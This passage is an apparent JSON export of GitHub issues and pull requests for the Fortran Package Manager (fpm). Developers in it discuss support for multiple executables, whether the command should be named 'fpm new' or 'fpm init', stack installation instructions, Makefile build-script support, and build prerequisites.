            "text": "Following the discussion at the monthly call, I've installed fpm and am trying to convert a few of my Fortran projects to the recommended structure. These projects involve some legacy fixed-style functions and subroutines, an interface module, and several driver programs (tests). The folder structure is something like:\n.\n\u251c\u2500\u2500 drivers\n\u2502   \u251c\u2500\u2500 driver1.f90\n|   \u2514\u2500\u2500 driver2.f90\n\u251c\u2500\u2500 src\n\u2502   \u251c\u2500\u2500 legacy\n|   |   \u251c\u2500\u2500 legacy1.f\n|   |   \u2514\u2500\u2500 legacy2.f\n|   \u2514\u2500\u2500 interface.f90\n\u2514\u2500\u2500 fpm.toml\n\nDo I need to add multiple sections such as\n[[driver]]\nname = \"driver1\"\nsource-dir = \"drivers\"\nmain = \"driver1.f90\"\n\nto the TOML file? Right now my build just crashes because of multiple executable files.\nI think having multiple executable programs is a quite common type of package, say you have a library for building mesh triangulations, and then with it a small set of command line tools calling routines from this common library.\nAnother question is can I already specify dependencies on system-wide installed libraries. Say a project (or one of it's dependencies) needs to be linked with -llapack -lblas (with the actual LAPACK and BLAS libraries potentially in some non-default location). Does this fit under issue #99 of custom build scripts?\nI had a few other comments about the installation process, but they were already fixed in #101. A remaining point might be that after doing stack install in the fpm folder, the ${HOME}/.local/bin/ folder might not be on the path already, requiring an extra command export PATH=\"$PATH:$HOME/.local/bin/\".",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2020-06-21 13:50:08+00:00",
                    "text": "Here is the project I am trying to convert to be fpm-usable: https://github.com/ivan-pi/fortran_lsp/tree/fpm"
                },
                {
                    "user": "LKedward",
                    "date": "2020-06-22 07:34:25+00:00",
                    "text": "Hi @ivan-pi, regarding multiple drivers I believe the current fpm behaviour allows only one executable source file per folder, where any other Fortran files in that same folder are assumed to be modules; this is undocumented I think because the behaviour is still under discussion, see #91 - the suggestion there by @certik seems promising.\n\nA remaining point might be that after doing stack install in the fpm folder, the ${HOME}/.local/bin/ folder might not be on the path already, requiring an extra command export PATH=\"$PATH:$HOME/.local/bin/\".\n\nThis is a good point and should probably be added to the README."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-06-22 09:27:29+00:00",
                    "text": "Thanks @LKedward  for pointing me to the previous discussion. It seems that this issue is then a duplicate. @everythingfunctional and @certik, should I close this issue and comment in #91 instead?\n\nThis is a good point and should probably be added to the README.\n\nI will create a pull request in the next day or two."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-22 22:06:03+00:00",
                    "text": "Hi @ivan-pi , thanks for trying out fpm with your project. You can have more than one executable per project, but as @LKedward pointed out you must have them in separate folders. Not that the entry in the toml file starts as [[executable]] instead of [[driver]], or it seemed like you considered these to be test programs, so you may want to specify them with [[test]].\nAs for the compiler flags, we haven't really gotten a good handle on how to deal with those. The problem mostly comes from what to do with them in terms of dependencies. Does a project's dependencies get compiled with the flags it specified? What about projects that depend on it? What about if you switch compilers? It's on our radar, it's just a really hard problem that we haven't tackled yet.\nYou can close this issue if you feel the other adequately covers it. Also, feel free to open up other issues if you want make sure we keep track of anything else you asked here."
                },
                {
                    "user": "certik",
                    "date": "2020-06-22 22:20:36+00:00",
                    "text": "I believe Cargo supports to have multiple main programs in the bin directory. I think we agreed to use an app directory instead of bin. Is there a reason why fpm cannot compile those automatically?\nIt is intuitive and natural. I would expect it to work also."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-22 22:35:36+00:00",
                    "text": "It's not that we can't support it, it just makes things more complicated than \"everything else in this folder is a module that should be compiled and linked in\".\nWe (sort of) support having multiple programs in the app directory, they just have to be in separate sub-folders and have explicit entries in fpm.toml."
                },
                {
                    "user": "certik",
                    "date": "2020-06-22 22:39:44+00:00",
                    "text": "Yes, it's a little more complicated, but it makes life so much easier for the end user. That is the whole point of fpm. :)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-22 23:54:46+00:00",
                    "text": "Yeah, that's probably true."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-23 16:07:50+00:00",
                    "text": "fpm init could generate the appropriate [[executable]] sections for the user. Just throwing an idea out there, not something that I think is a priority."
                },
                {
                    "user": "certik",
                    "date": "2020-06-23 18:18:43+00:00",
                    "text": "Cargo does not require any modifications to Cargo.toml to have executables. We should not either. So fpm init just produces the default initial fpm.toml, and users don't need to touch it, they just create the app dir and put programs in it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-23 18:43:16+00:00",
                    "text": "Yes, the sane default of multiple programs in app/ is what we should aim for.\nMy comment about fpm init was specific to the scenario of multiple programs in custom (non-default) location, which needs to be specified in the toml file, just like Cargo does.\nI actually didn't know (or forgot) that we supported multiple executables by specifying them in fpm.toml, so I was happy to read about it in this thread."
                },
                {
                    "user": "lauvergn",
                    "date": "2020-07-07 18:08:02+00:00",
                    "text": "Yes, it's a little more complicated, but it makes life so much easier for the end user. That is the whole point of fpm. :)\n\nYes, that will great !!\nalias gardhor"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-19 19:24:36+00:00",
                    "text": "Is this issue still relevant?\nI recall @LKedward mentioning somewhere that my fortran_lsp repo could be built fpm, meaning that this has been resolved."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-22 09:27:46+00:00",
                    "text": "Hi @ivan-pi, yes I believe this issue is now solved."
                }
            ]
        },
        {
            "number": 104,
            "user": "certik",
            "date": "2020-06-20 23:01:41+00:00",
            "title": "Remove the space before comma",
            "text": "This is a fixup of #101.",
            "comments": []
        },
        {
            "number": 103,
            "user": "EverLookNeverSee",
            "date": "2020-06-20 19:53:09+00:00",
            "title": "ENH: Using OpenMP in stdlib",
            "text": "Hi there\nI started learning OpenMP couple weeks ago and would like to use it to parallelize and speed up fortran standard library codebase.",
            "comments": []
        },
        {
            "number": 102,
            "user": "everythingfunctional",
            "date": "2020-06-19 03:36:59+00:00",
            "title": "Enable fpm to create a new package",
            "text": "This is just the bare minimum I would say is necessary for fpm new.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 13:56:15+00:00",
                    "text": "A minor observation: I expected the behaviour to be to initialise a project in the current directory (like git init), as opposed to the command creating a new directory - but I think that is just something that needs documenting somewhere for users.\n\nThis (fpm new) behaviour is analogous to cargo new, and what you describe is analogous to cargo init. So if we wanted to have this, it would be covered by fpm init."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-19 14:56:51+00:00",
                    "text": "Yeah, I'll add some documentation to the README, and maybe PACKAGING.md"
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 17:33:44+00:00",
                    "text": "I believe this should be called init.\n\nFurthermore, it should initialize in the current directory without an argument, or create a new directory with an argument, just like git or Cargo.\n\nLet's keep the UI as similar to others established tools as possible.\n\u2026\nOn Fri, Jun 19, 2020, at 8:57 AM, Brad Richardson wrote:\n\n\n Yeah, I'll add some documentation to the README, and maybe PACKAGING.md\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#102 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHVVJAAHKPTZZ565HTRXN4EFANCNFSM4OCLLZMQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 18:03:24+00:00",
                    "text": "@certik, see cargo new and cargo init.\nIn short, cargo new (and likewise, fpm new) creates a new directory and initializes the TOML and starter source files. I think this is what this PR implements, but again, without a PR description or some example in the documentation, hard to say. @everythingfunctional can you please describe the behavior with a small example? How is this invoked? What files are created?\ncargo init initializes the package in an existing directory with existing source files. So fpm init will be used to \"fpm-ize\" an existing package that obeys the fpm layout. fpm new is used to bootstrap a new empty package. They're different.\nAt least this is my understanding of it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 18:04:54+00:00",
                    "text": "@everythingfunctional can you please describe the behavior with a small example? How is this invoked? What files are created?\n\nSorry, I didn't mean to nag. :) I saw your earlier response after writing this."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 18:26:07+00:00",
                    "text": "No, cargo init creates a new package in the current directory and cargo init b creates a new package in a new directory b. I am not sure what the difference is to cargo new. But I've only used cargo init and it creates a new package from scratch."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 18:27:04+00:00",
                    "text": "See #96 where I go into all the details. See also #96 (comment)."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 18:31:06+00:00",
                    "text": "Both cargo new and cargo init seem identical to me. They both initialize in you current directory, or in a new directory if you provide it as an argument. The initialized files seem identical. What is the difference between the two?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 19:19:21+00:00",
                    "text": "cargo new only creates a new directory and initializes a project in it.\ncargo init initializes a project in an existing directory, and optionally does what cargo new does.\nFor cargo new, PATH is required. For cargo init, PATH is optional.\nIndeed, if starting from scratch, they appear very much the same and redundant.\nHowever, if there is anything special about the directory layout (multiple binaries, tests etc.) and contents that would be reflected in Cargo.toml, I would expect cargo init to do that. But I don't think it does, at least in the simple example I tried.\nFor fpm it should. For example, if you have a package layout with multiple programs, fpm init should be able to output a correct fpm.toml according to the special layout.\nfpm new simply bootstraps something from scratch.\nIt's very nice and useful to use Cargo and Rust for reference, but it's not an end all. We're not targeting Rust users. What we make should make sense to us. fpm new for a new project very much makes sense, and fpm init makes more sense for initializing an existing project."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 20:45:20+00:00",
                    "text": "For me it makes sense to use \"fpm init\" like \"git init\". Create a new project from scratch.\n\nI don't think by default it should do something different based on an existing project. However let's have it as an option.\n\nWe should optimize for the most common use case. I think that would be to start a new project from scratch.\n\nAlso, let's have only one command, init. Having two seems redundant and confusing.\n\u2026\nOn Fri, Jun 19, 2020, at 1:19 PM, Milan Curcic wrote:\n\n\n `cargo new` only creates a new directory and initializes a project in it.\n\n `cargo init` initializes a project in an existing directory, and\n optionally does what `cargo new` does.\n\n For `cargo new`, `PATH` is required. For `cargo init`, `PATH` is optional.\n\n Indeed, if starting from scratch, they appear very much the same and redundant.\n\n However, if there is anything special about the directory layout\n (multiple binaries, tests etc.) and contents that would be reflected in\n Cargo.toml, I would expect `cargo init` to do that. But I don't think\n it does, at least in the simple example I tried.\n\n For fpm it should. For example, if you have a package layout with\n multiple programs, `fpm init` should be able to output a correct\n fpm.toml according to the special layout.\n\n `fpm new` simply bootstraps something from scratch.\n\n It's very nice and useful to use Cargo and Rust for reference, but it's\n not an end all. We're not targeting Rust users. What we make should\n make sense to us. `fpm new` for a new project very much makes sense,\n and `fpm init` makes more sense for initializing an existing project.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#102 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWBLCKEQ6AJ52AAUTJLRXO24NANCNFSM4OCLLZMQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 21:19:46+00:00",
                    "text": "For me it makes sense to use \"fpm init\" like \"git init\". Create a new project from scratch.\n\ngit init actually does not only create a new project from scratch. It initializes existing files in the directory into the git repository if there are any. It does also create a new git repository. I think it's difficult to argue that the word \"init\" is more intuitive for creating something new than the word \"new\". To me \"init\" means initialize, which means enable some capability in existing directory+files. In the context of fpm, that would mean simply create fpm.toml given existing pakage layout.\nBut I agree that we shouldn't have redundant commands like Cargo does. It looks like the choice is whether we want to have one command that does multiple things or two narrowly-scoped commands.\n\nWe implement just fpm init which can both create a new empty project and \"fpm-ize\" an existing non-fpm package (basically generate a correct fpm.toml);\nWe implement fpm new that creates an empty project and fpm init to initialize an existing package.\n\nI think @certik prefers option 1. I prefer option 2. as it's easier to understand to me. There may be some other options I missed. @everythingfunctional @LKedward what do you prefer?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 21:24:07+00:00",
                    "text": "An argument for fpm init over fpm new (all else being equal) is that init is a verb and new is a noun. Using a verb would be more consistent with our existing commands (build, install, run, test), and semantically makes more sense (do this with that).\nSo I am not opposed to the word \"init\". But I do prefer smaller utility commands over more general ones that would behave differently depending on current directory."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-19 22:24:39+00:00",
                    "text": "Technically, giti init doesn't create a new project from scratch. It initializes an existing project's git configuration.\nI like having two different commands because they do two different things. fpm new for new projects, and fpm init for existing projects.\nSince the most common use case would be to start a new project from scratch, that's why I implemented it first."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 23:06:05+00:00",
                    "text": "How often do you expect to initialize fpm for an existing project? I don't ever expect to do that, after I convert my existing projects. So I don't think we should optimize for this rare case.\n\nSo I vote to rename new to init and we are in agreement.\n\u2026\nOn Fri, Jun 19, 2020, at 4:24 PM, Brad Richardson wrote:\n\n\n Technically, `giti init` doesn't create a new project from scratch. It\n initializes an existing project's git configuration.\n\n I like having two different commands because they do two different\n things. `fpm new` for new projects, and `fpm init` for existing\n projects.\n\n Since the most common use case would be to start a new project from\n scratch, that's why I implemented it first.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#102 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWFIEEUF4HMPJRLSMM3RXPQTHANCNFSM4OCLLZMQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-19 23:24:53+00:00",
                    "text": "How often do you expect to initialize fpm for an existing project? I don't ever expect to do that, after I convert my existing projects.\n\nI expect that we'll use fpm init quite often in the early days, perhaps even more often than fpm new, as we'll work hard on adapting existing Fortran packages (ours and those of others) into fpm. In the long run, I expect fpm new would be used more often.\nIt also depends how you're used to doing things. I never ever ran git init to create a new repo from scratch. I always run it after I've written and played with some code and want to make a git repo out of it. Same with fpm. For any more complex layout package, I'd much rather run fpm init and have fpm write the fpm.toml for me, than me editing it by hand every time I add a new file.\nEven if it's an edge case and something that we'd want down the road, I think it's useful to carefully design and name things early on."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 23:53:03+00:00",
                    "text": "I always indeed run \"git init\" on an empty repository to start a new project.\n\nRegarding adding new files, you don't modify fpm.toml when you do that.\n\u2026\nOn Fri, Jun 19, 2020, at 5:25 PM, Milan Curcic wrote:\n\n\n > How often do you expect to initialize fpm for an existing project? I don't ever expect to do that, after I convert my existing projects.\n\n I expect that we'll use `fpm init` quite often in the early days,\n perhaps even more often than `fpm new`, as we'll work hard on adapting\n existing Fortran packages (ours and those of others) into fpm. In the\n long run, I expect `fpm new` would be used more often.\n\n It also depends how you're used to doing things. I never ever ran git\n init to create a new repo from scratch. I always run it after I've\n written and played with some code and want to make a git repo out of\n it. Same with fpm. For any more complex layout package, I'd much rather\n run `fpm init` and have fpm write the fpm.toml for me, than me editing\n it by hand every time I add a new file.\n\n Even if it's an edge case and something that we'd want down the road, I\n think it's useful to carefully design and name things early on.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#102 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWDWQADEDJQCBLH5LDLRXPXVDANCNFSM4OCLLZMQ>."
                },
                {
                    "user": "certik",
                    "date": "2020-06-19 23:54:59+00:00",
                    "text": "More generally, let's follow what Rust does, it's a well tested approach. Once we use it and don't like it, then let's discuss to do something else.\n\u2026\nOn Fri, Jun 19, 2020, at 5:52 PM, Ond\u0159ej \u010cert\u00edk wrote:\n I always indeed run \"git init\" on an empty repository to start a new project.\n\n Regarding adding new files, you don't modify fpm.toml when you do that.\n\n On Fri, Jun 19, 2020, at 5:25 PM, Milan Curcic wrote:\n >\n >\n > > How often do you expect to initialize fpm for an existing project? I don't ever expect to do that, after I convert my existing projects.\n >\n > I expect that we'll use `fpm init` quite often in the early days,\n > perhaps even more often than `fpm new`, as we'll work hard on adapting\n > existing Fortran packages (ours and those of others) into fpm. In the\n > long run, I expect `fpm new` would be used more often.\n >\n > It also depends how you're used to doing things. I never ever ran git\n > init to create a new repo from scratch. I always run it after I've\n > written and played with some code and want to make a git repo out of\n > it. Same with fpm. For any more complex layout package, I'd much rather\n > run `fpm init` and have fpm write the fpm.toml for me, than me editing\n > it by hand every time I add a new file.\n >\n > Even if it's an edge case and something that we'd want down the road, I\n > think it's useful to carefully design and name things early on.\n >\n > \u2014\n > You are receiving this because you were mentioned.\n > Reply to this email directly, view it on GitHub\n > <#102 (comment)>,\n > or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAAFAWDWQADEDJQCBLH5LDLRXPXVDANCNFSM4OCLLZMQ>.\n >"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-20 02:42:07+00:00",
                    "text": "I honestly didn't even know that git init directory was a valid command. I learned something new today! I always thought you just had to git init inside a directory, existing files or not.\nI still think that the command that makes the most sense for creating a new project is fpm new, even if that's not what Cargo does. Although I will note the following output from cargo, which would seem to suggest that cargo somewhat agrees with me. cargo new is for a new cargo package and cargo init is for in an existing directory.\n[darter:~] cargo help new\ncargo-new \nCreate a new cargo package at <path>\n\nUSAGE:\n    cargo new [OPTIONS] <path>\n\n[darter:~] cargo help init\ncargo-init \nCreate a new cargo package in an existing directory\n\nUSAGE:\n    cargo init [OPTIONS] [--] [path]"
                },
                {
                    "user": "certik",
                    "date": "2020-06-20 17:04:23+00:00",
                    "text": "Here is the guide for Cargo:\nhttps://doc.rust-lang.org/cargo/guide/creating-a-new-project.html\nit seems they recommend cargo new also.\nI explained my position above, Milan and Brad explained theirs, and it looks like they prefer to use fpm new instead of fpm init to start a new package. So unless more people have an opinion right now, let's go with fpm new and move on.\nHowever, I reserve the right to run a poll later on, and if more people prefer fpm init, let's reconsider. Until then, let's do fpm new."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-20 18:21:39+00:00",
                    "text": "However, I reserve the right to run a poll later on, and if more people prefer fpm init, let's reconsider. Until then, let's do fpm new.\n\nDefinitely, we don't have a majority agreement right now."
                }
            ]
        },
        {
            "number": 101,
            "user": "EverLookNeverSee",
            "date": "2020-06-17 11:51:54+00:00",
            "title": "Optional Fix for README",
            "text": "Separating navigating to stack directory and Adding to PATH\nBecause some of users may navigate to stack directory first and and enter this command(export PATH=\"$PATH:pwd/stack-2.1.3-linux-x86_64-static/)  in order to install stack command that causes error below in $PATH:\nNo such file or directory",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-06-17 12:13:30+00:00",
                    "text": "@everythingfunctional This reminds me of a question I wanted to ask about the instructions for installing stack: why does the README recommend following the 'Manual Download' instructions as opposed to using the simpler install script or distribution package managers? I used the Ubuntu distribution package followed by running $ stack upgrade which was much simpler and works fine.\nThe instructions for installing stack are pleasantly comprehensive (and cross-platform!) and I think we should simply refer users to this page and allow them to choose their preferred installation method."
                },
                {
                    "user": "EverLookNeverSee",
                    "date": "2020-06-17 14:40:43+00:00",
                    "text": "I think this is a positive change, as our specific instruction was Linux only.\n\nThank you @milancurcic for approving this PR."
                },
                {
                    "user": "EverLookNeverSee",
                    "date": "2020-06-17 14:45:34+00:00",
                    "text": "Thanks @EverLookNeverSee , I agree this is an improvement.\nUnless Brad had a specific reason for recommending the manual installation method, I think this is good to merge with one change: can you revert 7ee74b1?\n\nOk, I'll revert it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-17 16:20:15+00:00",
                    "text": "@certik wanted to support people who didn't have sudo access to install system wide. I agree that the official stack install instructions are generally the preferred way, so I support this change. We may  want to have a separate section to put the manual install instructions somewhere just in case."
                },
                {
                    "user": "certik",
                    "date": "2020-06-17 20:34:11+00:00",
                    "text": "I would like to keep it in some form, as requiring a sudo access is a non-starter on almost any machine where I would like to use fpm (I don't have sudo access)."
                },
                {
                    "user": "jvdp1",
                    "date": "2020-06-17 20:50:39+00:00",
                    "text": "I would like to keep it in some form, as requiring a sudo access is a non-starter on almost any machine where I would like to use fpm (I don't have sudo access).\n\nI agree. Could this link  just be mentioned to replace the deleted section. Furthermore, all OS are described there."
                },
                {
                    "user": "certik",
                    "date": "2020-06-17 21:43:57+00:00",
                    "text": "I think that link would work."
                },
                {
                    "user": "EverLookNeverSee",
                    "date": "2020-06-20 07:59:48+00:00",
                    "text": "@certik\nWhat should we do for this PR?"
                },
                {
                    "user": "EverLookNeverSee",
                    "date": "2020-06-21 06:52:32+00:00",
                    "text": "@certik Thanks for merging."
                }
            ]
        },
        {
            "number": 100,
            "user": "milancurcic",
            "date": "2020-06-16 17:52:56+00:00",
            "title": "add a note about Effing Package Management and elaborate on prototype",
            "text": "This PR:\n\nAdds a clarification about the other fpm\nExpands the note on fpm being an early prototype\n\nFixes #90",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-16 18:09:05+00:00",
                    "text": "Minor wording change suggestion, but other than that this looks good. Thanks for tackling this one."
                },
                {
                    "user": "certik",
                    "date": "2020-06-16 18:29:33+00:00",
                    "text": "I would also add at the end:\nAs the prototype matures and we enter production, we will do our best to stay backwards compatible.\n(Otherwise looks good, thanks!)"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-16 18:51:40+00:00",
                    "text": "Thank you, both. Merging."
                }
            ]
        },
        {
            "number": 99,
            "user": "everythingfunctional",
            "date": "2020-06-15 00:11:07+00:00",
            "title": "Add support for Makefiles and generic build scripts",
            "text": "",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-15 00:33:29+00:00",
                    "text": "I think I might need some help from somebody who understands Windows a bit better to help me with the issue there. I'm guessing either something with the absolute paths is screwing up make, or the environment variables aren't working properly. I'm leaning towards the former, but I don't have access to a Windows machine to test it with at the moment."
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 01:00:39+00:00",
                    "text": "The windows error is:\n# gfortran (for build/gfortran_debug/test/main.o)\n# gfortran (for build/gfortran_debug/test/runTests.exe)\n Hello, from test!\nmingw32-make: *** No rule to make target 'D:\\a\\fpm\\fpm\\test\\example_packages\\with_makefile\\build\\gfortran_debug\\with_makefile\\libwith_makefile.a'.  Stop.\nmingw32-make: *** No rule to make target 'D:\\a\\fpm\\fpm\\test\\example_packages\\makefile_complex\\build\\gfortran_debug\\with_makefile\\libwith_makefile.a'.  Stop.\nmingw32-make: *** No rule to make target 'D:\\a\\fpm\\fpm\\test\\example_packages\\makefile_complex\\build\\gfortran_debug\\makefile_complex\\libmakefile_complex.a'.  Stop."
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 04:20:47+00:00",
                    "text": "I am worried it's going to mess up buildsystems. Cargo is not using such variables either.\n\u2026\nOn Sun, Jun 14, 2020, at 9:53 PM, Brad Richardson wrote:\n\n\n ***@***.**** commented on this pull request.\n\n In test/example_packages/makefile_complex/Makefile\n <#99 (comment)>:\n\n > @@ -0,0 +1,9 @@\n +INCLUDE_FLAGS = $(addprefix -I,$(INCLUDE_DIRS))\n +\n +$(BUILD_DIR)/libmakefile_complex.a: $(BUILD_DIR)/wrapper_mod.o\n The ones I used are actually the standard environment variables for\n Makefiles. You (almost) can use an empty Makefile and these would\n actually work. We can use prefixed variables, but it's one extra\n difference from what a lot of people will already have and be used to.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#99 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGC5W5YVTCC3G5C4JDRWWLMJANCNFSM4N5VZI5A>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-15 04:53:46+00:00",
                    "text": "I am worried it's going to mess up buildsystems. Cargo is not using such variables either.\n\nI'm not sure I understand. The environment variables are only set while fpm is running. Can you give me an example of a situation that might break?"
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 05:58:10+00:00",
                    "text": "I'm not sure I understand. The environment variables are only set while fpm is running. Can you give me an example of a situation that might break?\n\nI don't know for sure, but an example would be an autotools build system, that reads these common environment variables, and if they are set by fpm it might break the build. I've definitely seen build systems where things break if you set these variables. So then the user would have to unset them before running autotools.\nIt seems that prefixing them with FPM_, it would ensure that as we expose more variables in the future, things that already work will continue working.\nHowever, one variable I would set automatically, and that is CMAKE_PREFIX_PATH. I think Spack does it, and that makes any CMake project to easily find all the fpm dependencies without the user having to do anything.\nI think your idea is to follow a similar philosophy for raw Make also.\nAlso as a documentation, it's hard to tell from looking at the script who sets the BUILD_DIR variable. But if it is FPM_BUILD_DIR, then it is clear that it is set by fpm.\nI don't know. Let's try this, and keep our options open to possibly prefix it if we run into problems?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-15 06:16:40+00:00",
                    "text": "My thinking is that if having those environment variables set means your build script doesn't work, that your build script isn't compatible with fpm, and you need a different one for fpm to use. Since the variables aren't persistent after fpm is done running, it won't break existing build systems. They can coexist side by side.\nIf we use prefixed variables, then users are practically guaranteed to have to write a new build script for fpm to use. If we use commonly used ones, there's a chance their existing one might actually work.\nI agree, let's see how this works out, and if we have to change it later, we can.\nI'm not all that familiar with CMake, but we can always do different things for different build tools when we add support for them."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-15 14:53:04+00:00",
                    "text": "My only minor nitpick is with the compounding of Makefiles and build scripts / executables in the fpm.toml definition\n\nI hadn't really thought about it that hard. It's worth considering. Usually I'd agree, but somehow this seemed simpler from a user and documentation stand point. If you have a custom build process, there's one way/place to specify it, and fpm just knows what to do with it.\n@milancurcic or @certik , do you guys have an opinion on this?"
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 17:07:21+00:00",
                    "text": "These are all really tough questions with good arguments on both sides. My only suggestion is to be open and open to change things if things don't feel right. I think the way forward is to insist that we are still in a prototype phase, and so things can (and will) change --- let's put this in bold in the README? And in a prototype phase, let's just try it, and get more experience, and be ready to change things. Only after we declare we are in production, we should be backwards compatible as  much as possible.\nIn general, I was hoping that fpm would simply execute the \"script\" as an executable, and always pass the same environment variables. I feel it is ok for fpm to know how to execute the script properly, so a bash script using bash, a Xonsh script using Xonsh, Make file using make, and an executable as an executable.\nI think it is absolutely ok for users to write a short build script. You will have to do it anyway for cmake projects."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-06-15 18:10:22+00:00",
                    "text": "I don't see issues with this. Like @certik said, let's try it and we can revise if there's need for it. We can't think of all correct answers ahead of time without trying things first in practice.\nMinor nit pick: As a user I didn't expect that for using make the build_script value would be Makefile or *.mk. build_script = \"make\" or build_script = \"make target\" seems more intuitive, because that's what I would've typed otherwise. However, this is also perhaps problematic because neither Makefile nor make are scripts (Makefile is a specification file and make is a command/tool). Perhaps a build_command parameter would be more appropriate if both arbitrary scripts and make are to be invoked with it."
                },
                {
                    "user": "certik",
                    "date": "2020-06-15 19:47:09+00:00",
                    "text": "One issue with build_command is that we need to specify the shell. So it could be Bash on Linux/macOS and PowerShell on Windows. Simple commands like make target would work in both. More advanced things, such as referencing an environment variable will not work cross-platform. Essentially the issue is a lack of cross-platform shell.\nRust / Cargo goes around this by simply writing the \"build script\" in Rust itself, thus making it cross-platform.\nI think there is a huge need for a cross-platform native shell. We even started one: https://github.com/xonsh/minixonsh (Xonsh itself is one, but being a Python program, it has the typical Python issues related to distribution and speed).\nBut until there is one (and well supported), I think we should not just pick one and require it.\nSo given all of this, the two option are:\n\n\nbuild_script would be directly executed in Bash / PowerShell, so you have to use a subset that works in both, such as make or make target. Or bash my_buildscript.sh.\n\n\nbuild_script points to a script or executable that gets executed. So Makefile gets executed via make, as fpm knows this.\n\n\nI still think 2. seems better.\nBut overall, I don't know what the best way forward is. So let's just try something to get moving, and iterate."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-16 02:48:48+00:00",
                    "text": "I think there will be some packages which are just not supported on all platforms, and that's ok. As a community we can encourage that and provide support when we're able, but that's going to be a big hurdle in some instances.\nAs everybody seems to agree, let's try this PR out and see how it goes."
                }
            ]
        },
        {
            "number": 98,
            "user": "epagone",
            "date": "2020-06-13 18:35:35+00:00",
            "title": "Add pre-requisites to `stack build` in `README`",
            "text": "On my Ubuntu 20.04 machine, I have installed Haskell Stack unpacking the tarball and adding it to my PATH, as described in the README. After having cloned the fpm repository, stack build failed because I did not have the developers library of gmp (the package libgmp-dev, in my case). I have created PR #97 to add this information to the README (plus the fix to a trivial typo).\nHowever, I believe that we should provide the user with info to cover far more cases (consider also that my test did not start from a \"vanilla\" Ubuntu 20.04 and it is likely that I had already some required packages installed without knowing it). Ideally, I think that the following should be covered in the README:\n\npackages required for all the major GNU/Linux distributions\npre-requisites on Windows 8 and 10\npre-requisites on Apple OSs\n\nConsidering that I have no clue on how to action the above points, I wonder if the CI tools could help. (Disclaimer: I only vaguely know what CI is.)\nPS: just for the records, I was temporary stopped also by the following error in my attempts to complete stack build\n$ stack build\nLinking /home/emanuele/.stack/setup-exe-cache/x86_64-linux-tinfo6/tmp-Cabal-simple_mPHDZzAJ_2.4.0.1_ghc-8.6.5 ...\nclock               > configure         \nclock               > Configuring clock-0.8...\nclock               > build             \ncolour              > configure         \nclock               > Preprocessing library for clock-0.8..\nclock               > Building library for clock-0.8..\nclock               > [1 of 1] Compiling System.Clock\ncolour              > Configuring colour-2.3.5...\ncolour              > build             \nfile-embed          > configure         \ncolour              > Preprocessing library for colour-2.3.5..\ncolour              > Building library for colour-2.3.5..\ncolour              > [ 1 of 14] Compiling Data.Colour.CIE.Chromaticity\nfile-embed          > Configuring file-embed-0.0.11.1...\nfile-embed          > build             \nfile-embed          > Preprocessing library for file-embed-0.0.11.1..\nfile-embed          > Building library for file-embed-0.0.11.1..\ncolour              > [ 2 of 14] Compiling Data.Colour.CIE.Illuminant\nfile-embed          > [1 of 1] Compiling Data.FileEmbed\ncolour              > [ 3 of 14] Compiling Data.Colour.Chan\ncolour              > [ 4 of 14] Compiling Data.Colour.Internal\ncolour              > [ 5 of 14] Compiling Data.Colour.Matrix\ncolour              > [ 6 of 14] Compiling Data.Colour.RGB\nclock               > copy/register     \nclock               > Installing library in 